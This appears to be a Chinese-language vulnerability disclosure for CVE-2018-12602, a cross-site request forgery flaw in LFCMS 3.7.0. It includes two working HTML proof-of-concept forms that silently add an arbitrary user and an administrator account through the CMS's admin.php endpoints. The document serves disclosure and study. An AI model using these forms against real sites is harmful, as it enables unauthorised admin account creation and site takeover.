### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|LFCMS 3.7.0存在CSRF漏洞可添加任意用户账户或任意管理员账户|2018-06-20|Bay0net|[http://www.lfdycms.com/](http://www.lfdycms.com/) | [http://www.lfdycms.com/](http://www.lfdycms.com/) |3.7.0| [CVE-2018-12602](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12602)|  

#### 漏洞概述  

> 攻击者可通过构造 CSRF 请求，来新增任意用户。   

### POC实现代码如下：  

> 通过CSRF增加任意用户 的exp代码如下：  

``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Users/add.html" method="POST">
      <input type="hidden" name="username" value="test222" />
      <input type="hidden" name="email" value="test2@qq.com" />
      <input type="hidden" name="password" value="test222" />
      <input type="hidden" name="repassword" value="test222" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
> 通过CSRF增加管理员用户 的exp代码如下：  

``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Member/add.html" method="POST">
      <input type="hidden" name="username" value="admin2" />
      <input type="hidden" name="password" value="admin2" />
      <input type="hidden" name="repassword" value="admin2" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
